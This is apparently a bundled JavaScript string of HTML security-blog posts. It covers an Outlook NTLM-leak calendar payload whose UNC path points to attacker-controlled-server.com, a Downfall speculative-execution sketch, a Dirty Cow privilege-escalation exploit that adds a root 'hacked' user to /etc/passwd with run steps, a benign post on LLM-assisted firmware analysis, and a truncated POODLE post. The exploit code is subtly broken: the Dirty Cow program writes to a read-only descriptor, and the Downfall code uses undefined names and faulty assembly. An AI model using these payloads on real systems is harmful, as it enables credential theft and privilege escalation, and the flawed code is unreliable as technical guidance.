&nbsp;&nbsp;&nbsp;&nbsp;print(f"Serving on port {PORT}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;httpd.serve_forever()<br>
          </code>
        </div>

        <h3>Malicious Email Payload Example</h3>
        <div class="code-block">
          <code>
BEGIN:VCALENDAR<br>
VERSION:2.0<br>
BEGIN:VEVENT<br>
UID:123456<br>
SUMMARY:Malicious Reminder<br>
DTSTART;TZID=Europe/London:20231105T090000<br>
ATTACH;VALUE=URI:\\\\attacker-controlled-server.com\\malicious\\path<br>
END:VEVENT<br>
END:VCALENDAR<br>
          </code>
        </div>

        <h2>Impact and Risks</h2>
        <ul>
          <li><strong>Credential Theft:</strong> If an attacker successfully captures NTLM credentials, they can use them to authenticate against other systems on the same network, potentially gaining unauthorized access.</li>
          <li><strong>No User Interaction Needed:</strong> The lack of user interaction makes this vulnerability particularly dangerous, as even vigilant users can fall victim without realizing it.</li>
          <li><strong>Enterprise Threat:</strong> Organizations with a large number of Outlook users are especially at risk, as the exploit can be used to pivot through corporate networks.</li>
        </ul>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Update Microsoft Outlook:</strong> Microsoft has released patches for this vulnerability. Ensure that all systems are updated to the latest version of Outlook.</li>
          <li><strong>Disable SMB Outbound Traffic:</strong> Blocking outbound SMB traffic at the network perimeter can prevent credentials from being sent to an external server.</li>
          <li><strong>Use Protected Users Group:</strong> Members of this group in Active Directory are protected against NTLM authentication.</li>
          <li><strong>Implement NTLM Blocking Policies:</strong> Where possible, configure policies to restrict NTLM authentication and enforce Kerberos.</li>
        </ol>

        <h3>Defensive Example in PowerShell</h3>
        <div class="code-block">
          <code>
Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value "2"
          </code>
        </div>
        <p>
          This command enforces NTLM restrictions, significantly reducing the risk of credential theft.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,cb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Downfall (CVE-2022–40982)?</h2>
        <p>
          In August 2023, a critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.
        </p>

        <h2>Speculative Execution</h2>
        <p>
          Modern CPUs optimize performance by predicting and executing instructions ahead of time through speculative execution. However, speculative execution does not adhere to standard security checks during execution, which creates opportunities for attackers to access restricted data.
        </p>

        <h2>Downfall’s Mechanism</h2>
        <p>
          Downfall specifically exploits speculative execution in Advanced Vector Extensions (AVX). It leverages a use-after-free vulnerability during the speculative execution of AVX instructions to access sensitive data stored in vector registers.
        </p>

        <h2>Conceptual Exploit Example</h2>
        <p>
          Below is a conceptual C pseudocode to demonstrate how speculative execution attacks like Downfall work. This example is strictly for educational purposes only to understand the mechanics of such vulnerabilities.
        </p>
        <div class="code-block">
          <code>
#include &lt;stdio.h&gt;<br>
#include &lt;immintrin.h&gt;  // For AVX instructions<br>
#include &lt;stdint.h&gt;<br><br>

// Step 1: Setup memory and registers<br>
void setup_sensitive_data() {<br>
    volatile char secret[] = "SensitiveData"; // Simulated sensitive data<br>
    __m256i vector_data = _mm256_loadu_si256((__m256i *)secret); // Load data into vector register<br>
}<br><br>

// Step 2: Induce speculative execution<br>
void trigger_speculative_execution(char *probe_array) {<br>
    volatile uint64_t timing;<br>
    int speculative_index = 1024; // An index beyond bounds for speculative execution<br>
    char leaked_value;<br><br>

    // Access array in a way to induce speculative execution<br>
    if (speculative_index &lt; 512) {  // This branch is speculatively executed<br>
        leaked_value = probe_array[speculative_index];<br>
    }<br><br>

    // Measure timing to infer accessed value (side-channel analysis)<br>
    for (int i = 0; i &lt; 256; i++) {<br>
        timing = measure_timing(&amp;probe_array[i * 64]); // Simulated timing measurement<br>
        if (timing &lt; THRESHOLD) {<br>
            printf("Leaked value: %c\\n", i); // Print inferred value<br>
        }<br>
    }<br>
}<br><br>

// Step 3: Measure cache timing (side-channel)<br>
uint64_t measure_timing(void *addr) {<br>
    uint64_t start, end;<br>
    asm volatile (<br>
        "mfence\\n"<br>
        "lfence\\n"<br>
        "rdtsc\\n"      // Read time-stamp counter<br>
        "mov %%rax, %0\\n"<br>
        "mov (%1), %%r8\\n" // Access memory<br>
        "rdtscp\\n"<br>
        "mov %%rax, %1\\n"<br>
        "mfence\\n"<br>
        : "=r"(start), "=r"(end)<br>
        : "r"(addr)<br>
        : "rax", "rbx", "rcx", "r8"<br>
    );<br>
    return end - start;<br>
}<br><br>

// Main Function<br>
int main() {<br>
    char probe_array[256 * 64]; // Array for side-channel timing analysis<br><br>

    setup_sensitive_data();<br>
    trigger_speculative_execution(probe_array);<br><br>

    return 0;<br>
}
          </code>
        </div>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Intel Microcode Updates:</strong> Intel has released microcode updates to mitigate speculative execution vulnerabilities like Downfall. Update your system’s firmware to the latest version provided by your hardware vendor.</li>
          <li><strong>Implement Operating System Mitigations:</strong> Operating system vendors have introduced software-level protections, such as disabling AVX extensions on affected processors when microcode updates are unavailable.</li>
          <li><strong>Restrict Local Access:</strong> Ensure only trusted users have access to systems. Many speculative execution vulnerabilities require local access to exploit.</li>
          <li><strong>Monitor Performance Impact:</strong> Mitigations may degrade performance, especially for workloads heavily reliant on AVX instructions. Assess the trade-offs based on your environment.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Downfall (CVE-2022–40982) demonstrates the dangers of speculative execution vulnerabilities and the importance of constant vigilance in securing modern computing environments. Organizations must prioritize patching, enforce security policies, and consider performance impacts to balance security and efficiency.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,ub=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Dirty Cow?</h2>
        <p>
          In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.
        </p>

        <h2>What is Copy-On-Write (COW)?</h2>
        <p>
          Copy-On-Write (COW) is a memory optimization technique in Linux where multiple processes share the same memory pages for read operations. If one process tries to modify a shared page, the kernel creates a private copy for that process, ensuring changes don’t affect the original shared memory.
        </p>

        <h2>The Problem</h2>
        <p>
          Dirty Cow arises from a race condition in the kernel’s <code>mmap</code> system call during the handling of COW. By exploiting this condition, an attacker can gain write access to read-only memory, effectively modifying protected files like <code>/etc/passwd</code> or <code>/etc/shadow</code> to escalate privileges.
        </p>

        <h2>Exploitation Workflow</h2>
        <p>The Dirty Cow vulnerability enables an attacker to:</p>
        <ol>
          <li>Create a memory mapping of a file they want to overwrite.</li>
          <li>Exploit the race condition to bypass COW and write directly to the file.</li>
          <li>Modify files like <code>/etc/passwd</code> to add a root user or escalate privileges.</li>
        </ol>

        <h2>Demonstrating Dirty Cow (CVE-2016–5195)</h2>
        <p><strong>Disclaimer:</strong> This demonstration is for educational purposes only. Do not execute this on systems you do not own or have explicit permission to test.</p>

        <h3>Exploit Code</h3>
        <p>Save the following as <code>dirtycow.c</code>:</p>
        <div class="code-block">
          <code>
#include &lt;fcntl.h&gt;<br>
#include &lt;pthread.h&gt;<br>
#include &lt;string.h&gt;<br>
#include &lt;sys/mman.h&gt;<br>
#include &lt;stdio.h&gt;<br>
#include &lt;unistd.h&gt;<br><br>
char *target_file = "/etc/passwd";<br>
char *new_content = "hacked:x:0:0:hacked:/root:/bin/bash\\n";<br>
int f;<br><br>
void *madvise_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        madvise(arg, 100, MADV_DONTNEED);<br>
    }<br>
    return NULL;<br>
}<br><br>
void *write_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        lseek(f, 0, SEEK_SET);<br>
        write(f, new_content, strlen(new_content));<br>
    }<br>
    return NULL;<br>
}<br><br>
int main() {<br>
    f = open(target_file, O_RDONLY);<br>
    if (f &lt; 0) {<br>
        perror("Failed to open target file");<br>
        return 1;<br>
    }<br><br>
    char *map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, f, 0);<br>
    if (map == MAP_FAILED) {<br>
        perror("mmap failed");<br>
        return 1;<br>
    }<br><br>
    pthread_t t1, t2;<br>
    pthread_create(&amp;t1, NULL, madvise_thread, map);<br>
    pthread_create(&amp;t2, NULL, write_thread, NULL);<br><br>
    pthread_join(t1, NULL);<br>
    pthread_join(t2, NULL);<br><br>
    printf("Exploit complete. Check /etc/passwd for changes.\\n");<br>
    return 0;<br>
}
          </code>
        </div>

        <h3>Compiling and Running the Exploit</h3>
        <div class="code-block">
          <code>
# Compile the exploit<br>
gcc -pthread dirtycow.c -o dirtycow<br><br>
# Run the exploit<br>
./dirtycow<br><br>
# Check for changes<br>
cat /etc/passwd
          </code>
        </div>

        <p>Look for the new root user: <code>hacked:x:0:0:hacked:/root:/bin/bash</code>. You can now switch to this user:</p>
        <div class="code-block">
          <code>su hacked</code>
        </div>

        <h2>Mitigation</h2>
        <ol>
          <li><strong>Patch the Kernel:</strong> Update the Linux kernel to a version where the Dirty Cow vulnerability is fixed.</li>
          <li><strong>Use Access Controls:</strong> Restrict write access to sensitive files like <code>/etc/passwd</code> and <code>/etc/shadow</code> to privileged users only.</li>
          <li><strong>Enable SELinux or AppArmor:</strong> Mandatory Access Control frameworks can prevent unauthorized file modifications.</li>
          <li><strong>Limit Privileges:</strong> Run services and applications with the least privileges necessary to function.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Dirty Cow serves as a stark reminder of the potential impact of race conditions and privilege escalation vulnerabilities. While the Linux kernel is robust, vulnerabilities like this highlight the need for regular updates, proper system configuration, and defense-in-depth security practices.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,db=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Firmware Exploration: LLM as Your Annotator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      line-height: 1.6;
      max-width: 900px;
      margin: 2rem auto;
      padding: 0 1rem;
      color: #111827;
      background: #f9fafb;
    }
    h1, h2, h3 {
      color: #111827;
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 0.5rem;
    }
    h2 {
      margin-top: 2rem;
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 0.25rem;
    }
    h3 {
      margin-top: 1.5rem;
    }
    code {
      font-family: "Fira Code", Menlo, Monaco, Consolas, "Courier New", monospace;
      font-size: 0.9rem;
    }
    pre {
      background: #111827;
      color: #e5e7eb;
      padding: 1rem;
      border-radius: 0.5rem;
      overflow-x: auto;
      font-size: 0.9rem;
    }
    blockquote {
      border-left: 4px solid #3b82f6;
      padding-left: 1rem;
      color: #374151;
      margin: 1rem 0;
      background: #eff6ff;
    }
    ul, ol {
      padding-left: 1.4rem;
    }
    hr {
      border: 0;
      border-top: 1px solid #e5e7eb;
      margin: 2rem 0;
    }
    .emoji {
      font-style: normal;
    }
  </style>
</head>
<body>

  <h1>Firmware Exploration: LLM as Your Annotator</h1>

  <p>
    If you’ve ever opened a firmware image and stared at a hex dump thinking “nope,” you’re not alone.
  </p>

  <p>
    Modern IoT and embedded devices ship with complex firmware: full Linux distributions, RTOS kernels, proprietary bootloaders, custom update mechanisms, and often… questionable security decisions. Large-scale studies have shown that firmware is a gold mine for vulnerabilities, from hard-coded credentials to unsafe update logic and exposed debug interfaces.
  </p>

  <p>
    At the same time, governments and standards bodies are pushing manufacturers to treat firmware security seriously. NIST’s IoT Cybersecurity guidance and documents like SP 800-213/213A explicitly call out firmware, update mechanisms, and device integrity as critical capabilities for secure IoT products.
  </p>

  <p>
    In this post, I’m <strong>not</strong> going to pretend that a Large Language Model (LLM) will magically reverse engineer your firmware for you. Instead, I’ll show how you can use an LLM as an <strong>annotator and sidekick</strong> while you do the real work:
  </p>

  <ul>
    <li>Turning messy <strong>strings</strong> into structured hints</li>
    <li>Summarizing <strong>decompiled functions</strong></li>
    <li>Hypothesizing the purpose of weird <strong>config blobs and scripts</strong></li>
    <li>Supporting your <strong>threat modeling</strong> of the device</li>
  </ul>

  <p>All in a way that keeps you in control, and the AI in a supporting role.</p>

  <blockquote>
    <span class="emoji">⚠️</span> Everything here is about <strong>defensive security / research on devices you own or are authorized to test</strong>.
    Don’t use these techniques on systems you’re not allowed to touch.
  </blockquote>

  <hr />

  <h2>1. The Traditional Firmware Exploration Workflow (Very Short Version)</h2>

  <p>A very typical firmware exploration flow looks like this:</p>

  <ol>
    <li>
      <strong>Obtain firmware</strong><br />
      From a vendor update file, web UI, or by dumping flash via JTAG / SPI.
    </li>
    <li>
      <strong>Triage and unpack</strong><br />
      Use tools like <code>binwalk</code>, <code>dd</code>, <code>unsquashfs</code>, or <code>firmware-mod-kit</code> to unpack file systems and images.
    </li>
    <li>
      <strong>Scan for strings and patterns</strong><br />
      Use <code>strings</code>, <code>grep</code>, or custom scripts to find credentials, URLs, debug commands, etc.
    </li>
    <li>
      <strong>Reverse engineer binaries</strong><br />
      Use tools like <strong>Ghidra</strong>, IDA, Radare2, or Binary Ninja to analyze executables and libraries.
    </li>
    <li>
      <strong>Dynamic analysis / rehosting</strong><br />
      Use QEMU or specialized frameworks for firmware rehosting to actually run firmware in a controlled environment and interact with it.
    </li>
  </ol>

  <p>
    Each step is noisy and produces walls of text and code. That’s where an LLM can make things <strong>less painful</strong>.
  </p>

  <hr />

  <h2>2. Where LLMs Actually Help: “Annotator, Not Autopilot”</h2>

  <p>
    Recent work has looked at using LLMs for <strong>binary code understanding</strong>, such as:
  </p>
  <ul>
    <li>Recovering function names</li>
    <li>Summarizing binary code behavior</li>
    <li>Explaining decompiled functions at a higher level</li>
  </ul>

  <p>
    Industry research has also explored LLMs as <strong>reverse engineering sidekicks</strong> that help malware analysts explain decompiled functions, outline control flows, or draft detection logic—without replacing analysts.
  </p>

  <blockquote>
    <strong>You</strong> do the reversing.<br />
    <strong>The LLM</strong> helps label, summarize, cluster, and explain.
  </blockquote>

  <p>
    Think of it as a hyperactive junior sitting next to you, happy to generate function names, markdown notes, and hypotheses while you decide what’s real and what’s hallucination.
  </p>

  <p>Let’s walk through some concrete examples.</p>

  <hr />

  <h2>3. Strings + LLM: Turning Noise Into Hints</h2>

  <p>A classic first step on a firmware image is just:</p>

  <pre><code>strings firmware.bin | less</code></pre>

  <p>
    But this dumps <em>everything</em>: menu texts, error messages, random config keys, leftover debug prints, etc. You can make this a lot more effective with a little Python and an LLM.
  </p>

  <h3>3.1 Step 1 – Extract and filter strings</h3>

  <p>Here’s a small Python script to extract printable strings from a firmware blob:</p>

  <pre><code>import re
from pathlib import Path

def extract_strings(path, min_len=4):
    data = Path(path).read_bytes()
    pattern = rb"[ -~]{%d,}" % min_len  # printable ASCII
    return [s.decode(errors="ignore") for s in re.findall(pattern, data)]

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")

    # Naive filters: paths, URLs, shell-like commands
    interesting = [
        s for s in strings
        if ("/" in s or "http" in s or "ssh" in s or "admin" in s.lower())
    ]

    for s in interesting[:50]:
        print(s)</code></pre>

  <p>
    You now have a list of “interesting” candidate strings: endpoints, file paths, error messages, maybe even hidden menu options.
  </p>

  <h3>3.2 Step 2 – Ask the LLM to annotate</h3>

  <p>
    Take a subset of these strings (don’t paste your entire firmware dump into a cloud LLM—be mindful of confidentiality) and send them to an LLM with a prompt like:
  </p>

  <blockquote>
    You are an embedded security analyst.<br />
    The following strings were extracted from a router firmware image.<br /><br />
    1. <code>/bin/diagnostic_cli</code><br />
    2. <code>/usr/sbin/backup_cfg</code><br />
    3. <code>POST /apply.cgi</code><br />
    4. <code>admin:admin</code><br />
    5. <code>Enable remote management</code><br /><br />
    For each string:<br />
    - Guess what subsystem it might belong to (web UI, update system, debug, etc.).<br />
    - Mark whether it’s <strong>interesting for security review</strong> and why (1–2 sentences).
  </blockquote>

  <p>
    In code (pseudo-style, using a generic <code>llm_chat()</code> helper so you can plug in OpenAI / local LLM / etc.):
  </p>

  <pre><code>def annotate_strings_with_llm(strings_chunk):
    prompt = (
        "You are an embedded firmware security analyst.\\n\\n"
        "You are given a list of strings extracted from firmware.\\n"
        "For each string, produce:\\n"
        "- category: (web_ui | auth | config | debug | logging | update | other)\\n"
        "- interesting: (yes/no)\\n"
        "- reason: one short sentence.\\n\\n"
        "Strings:\\n"
        + "\\n".join(f"- {s}" for s in strings_chunk)
    )
    # Replace this with your LLM client call
    response = llm_chat(prompt)
    return response

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")
    interesting = [...]  # apply your filters
    chunk = interesting[:40]
    print(annotate_strings_with_llm(chunk))</code></pre>

  <p>
    Suddenly, instead of reading 300 anonymous strings, you get a <strong>structured, human-readable checklist</strong>:
  </p>

  <ul>
    <li>Possible backup subsystem</li>
    <li>Potential default creds</li>
    <li>Hidden diagnostic binaries</li>
    <li>Suspicious URLs / endpoints</li>
  </ul>

  <p>
    You still have to verify everything—but now you have a <strong>prioritized map</strong>.
  </p>

  <hr />

  <h2>4. Ghidra + LLM: Explaining Weird Functions</h2>

  <p>
    Once you move into static analysis, tools like <strong>Ghidra</strong> are the workhorse for exploring firmware binaries. You load ELF/ARM/MIPS binaries, let Ghidra analyze them, and then decompile functions into a pseudo-C view.
  </p>

  <p>
    The hard part is not “disassembling”—it’s <strong>understanding</strong> what a function actually does.
  </p>

  <p>
    Research and experiments with LLMs show they can help with tasks like:
  </p>
  <ul>
    <li><strong>Function name recovery</strong></li>
    <li><strong>Code summarization</strong></li>
    <li>Highlighting security-relevant behavior (auth, crypto, file access, network I/O, etc.)</li>
  </ul>

  <p>That’s perfect for our “annotator” idea.</p>

  <h3>4.1 Workflow</h3>

  <ol>
    <li>
      In Ghidra, decompile a function you suspect is security-relevant:
      <ul>
        <li>Maybe it’s referenced from the <code>/login</code> CGI handler</li>
        <li>Or from a firmware update routine</li>
      </ul>
    </li>
    <li>Copy a sanitized snippet of the decompiled C-like code (omit hard-coded secrets / proprietary stuff if using a cloud LLM).</li>
    <li>Ask the LLM something like:</li>
  </ol>

  <blockquote>
    You are assisting with firmware reverse engineering.<br />
    Here is a decompiled function from an embedded Linux binary (MIPS):<br /><br />
    <pre><code>int sub_40123C(char *user, char *pw) {
    FILE *f = fopen("/etc/passwd", "r");
    if (!f) return -1;
    ...
}</code></pre>
    Tasks:<br />
    1. Give this function a descriptive name (C-style).<br />
    2. Summarize what it does in bullets.<br />
    3. Call out any security-relevant behavior (auth checks, file access, cryptography, etc.).
  </blockquote>

  <p>You’ll often get surprisingly good results:</p>

  <ul>
    <li>Suggested names like <code>check_user_credentials</code>, <code>verify_login</code>, etc.</li>
    <li>Bullet summaries that highlight comparisons, suspicious file paths, or insecure checks.</li>
  </ul>

  <p>
    You can even script this: export decompiled functions or their summaries and feed them to an LLM in batches, building a <strong>“map” of the binary</strong> where each function has:
  </p>

  <ul>
    <li>A human-readable name</li>
    <li>A short description</li>
    <li>Tags like <code>auth</code>, <code>crypto</code>, <code>network</code>, <code>update</code></li>
  </ul>

  <p>
    This mirrors workflows used in both academic research and experimental tools that use LLMs as reverse engineering assistants for malware and binaries.
  </p>

  <hr />

  <h2>5. Configs, Scripts, and “Weird Blobs”: Semantic Tagging</h2>

  <p>
    Firmware images are full of non-binary artifacts:
  </p>
  <ul>
    <li>Shell scripts for initialization</li>
    <li>Lua / Python / proprietary scripting languages</li>
    <li>JSON / XML / custom config formats</li>
    <li>Web templates for CGI-based admin interfaces</li>
  </ul>

  <p>Instead of manually reading each file, you can:</p>

  <ol>
    <li><strong>Programmatically find candidates</strong> – files under <code>/etc/</code>, <code>/usr/script/</code>, <code>/www/</code>, etc.</li>
    <li><strong>Summarize them with an LLM</strong> to label purpose and risk.</li>
  </ol>

  <h3>5.1 Example: scanning shell scripts</h3>

  <pre><code>from pathlib import Path

def list_shell_scripts(root):
    root = Path(root)
    return list(root.rglob("*.sh"))

def summarize_script(path):
    content = Path(path).read_text(errors="ignore")[:4000]  # truncate just in case
    prompt = (
        "You are reviewing firmware init scripts.\\n\\n"
        f"File path: {path}\\n"
        "Script:\\n\\n"
        "\`\`\`sh\\n"
        f"{content}\\n"
        "\`\`\`\\n\\n"
        "Tasks:\\n"
        "1. Briefly summarize what this script does.\\n"
        "2. Call out any security-relevant actions "
        "(starting services, changing permissions, touching auth/crypto, enabling remote access).\\n"
        "3. Rate its review priority: high / medium / low.\\n"
    )
    return llm_chat(prompt)

if __name__ == "__main__":
    for p in list_shell_scripts("squashfs-root"):
        print("=== ", p, " ===")
        print(summarize_script(p))
        print()</code></pre>

  <p>This gives you:</p>

  <ul>
    <li>A quick view of <strong>which scripts matter</strong> (e.g., those enabling remote management or manipulating firewall rules).</li>
    <li>A better starting point when you need to dive deeper manually.</li>
  </ul>

  <p>You can do the same for:</p>

  <ul>
    <li>JSON configs: ask which keys look like <strong>feature flags</strong>, <strong>debug options</strong>, or <strong>update URLs</strong>.</li>
    <li>HTTP templates: ask which endpoints perform sensitive operations.</li>
  </ul>

  <hr />

  <h2>6. LLMs + Rehosting: Augmenting Dynamic Analysis</h2>

  <p>
    The more hardcore end of firmware analysis involves <strong>rehosting</strong>: running firmware in an emulated environment to see how it behaves at runtime. Researchers and practitioners use various frameworks to emulate peripheral devices and remove hardware dependencies.
  </p>

  <p>LLMs can help here too—but again, as annotators:</p>

  <ul>
    <li>
      <strong>Log analysis:</strong> feed chunks of runtime logs (HTTP requests, kernel messages, application logs) into the LLM and ask it to:
      <ul>
        <li>Summarize what the system is doing</li>
        <li>Highlight errors, crashes, or suspicious patterns (e.g., repeated failed logins)</li>
      </ul>
    </li>
    <li>
      <strong>Crash triage:</strong> when fuzzers targeting BusyBox or embedded binaries produce crashing inputs and stack traces, LLMs can help cluster and explain crash types.
    </li>
  </ul>

  <h3>6.1 Example prompt for log triage</h3>

  <blockquote>
    You are a firmware analyst. The following log lines come from an emulated router firmware:<br /><br />
    <pre><code>[HTTPD] POST /apply.cgi action=wan_settings
[HTTPD] user=admin from 192.168.0.10
[KERNEL] device eth0 entered promiscuous mode
[APP] enabling remote_management on port 8080
...</code></pre>
    1. Summarize the key events.<br />
    2. Identify any security-relevant changes.<br />
    3. Suggest 2–3 follow-up checks I should perform against this firmware.
  </blockquote>

  <p>
    You get a quick <strong>human-level summary</strong> instead of reading 500 lines manually.
  </p>

  <hr />

  <h2>7. Limitations and Risks: This Is Not Magic (and That’s Good)</h2>

  <p>Before we get too excited, reality check:</p>

  <ol>
    <li>
      <strong>Hallucinations are real</strong><br />
      LLMs can improve naming and summarization, but they still get things wrong and may invent functionality that isn’t present.
      <ul>
        <li>Never treat LLM output as ground truth.</li>
        <li>Use it as a <strong>hint</strong>, then confirm by reading the actual code / disassembly.</li>
      </ul>
    </li>
    <li>
      <strong>Confidentiality and IP</strong><br />
      If you’re analyzing proprietary firmware, uploading large chunks to a cloud LLM may be unacceptable (legally, ethically, or by contract).
      <ul>
        <li>Consider <strong>local open-source models</strong> for sensitive work.</li>
        <li>Use strict data minimization: send only what you must (e.g., one function, one script).</li>
      </ul>
    </li>
    <li>
      <strong>Ethics and legality</strong><br />
      Secure development and IoT guidance emphasize secure design, responsible vulnerability management, and lifecycle support.
      <ul>
        <li>Use these techniques to <strong>improve</strong> security, not undermine it.</li>
        <li>Follow responsible disclosure practices if you discover real issues.</li>
      </ul>
    </li>
    <li>
      <strong>Skill still required</strong><br />
      Experiences from LLM-powered reverse engineering consistently conclude that LLMs <strong>augment experts</strong>; they don’t turn beginners into instant firmware ninjas.
      <ul>
        <li>You still need to know how toolchains, OSes, networking, and cryptography work.</li>
        <li>LLMs amplify good analysts; they don’t replace them.</li>
      </ul>
    </li>
  </ol>

  <hr />

  <h2>8. Practical Tips: Making LLMs a Useful Firmware Sidekick</h2>

  <p>If you want to actually integrate LLMs into your firmware workflow, here are some practical patterns:</p>

  <ol>
    <li>
      <strong>Use strong roles in prompts</strong>
      <ul>
        <li>“You are an embedded firmware security analyst.”</li>
        <li>“You are assisting reverse engineering of a MIPS-based router binary.”</li>
      </ul>
    </li>
    <li>
      <strong>Give context concisely</strong>
      <ul>
        <li>Mention architecture (ARM/MIPS/x86), OS (Linux/RTOS), and approximate purpose (router, camera, PLC).</li>
        <li>This helps the model make better guesses about functions and config files.</li>
      </ul>
    </li>
    <li>
      <strong>Chunk smartly</strong>
      <ul>
        <li>Don’t send entire file systems.</li>
        <li>Work per-function, per-script, or per-log-chunk.</li>
      </ul>
    </li>
    <li>
      <strong>Always ask for structure</strong><br />
      Ask for JSON-like or bullet-pointed output, for example:
      <pre><code>{
  "function_name": "...",
  "high_level_summary": "...",
  "security_relevance": "..."
}</code></pre>
      <p>This makes it easier to feed back into your own tooling.</p>
    </li>
    <li>
      <strong>Build your own “knowledge notebook”</strong>
      <ul>
        <li>Store LLM explanations in markdown or a small database.</li>
        <li>Link them back to offsets / function addresses / file paths so you can quickly revisit them later.</li>
      </ul>
    </li>
    <li>
      <strong>Compare models</strong>
      <ul>
        <li>Some models are better at code; others at natural language.</li>
        <li>Try both cloud and local options, especially if you need privacy.</li>
      </ul>
    </li>
  </ol>

  <hr />
</body>
</html>`,pb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>POODLE and GOLDENDOODLE Attacks</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">POODLE and GOLDENDOODLE Attacks</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          Encryption protocols are the bedrock of secure online communication, ensuring that data transmitted over
          networks remains confidential and protected from unauthorized access. However, like any technology,
          encryption protocols can have vulnerabilities that skilled attackers can exploit. Two such attacks,
          <b>POODLE</b> (Padding Oracle On Downgraded Legacy Encryption) and <b>GOLDENDOODLE</b>, have gained
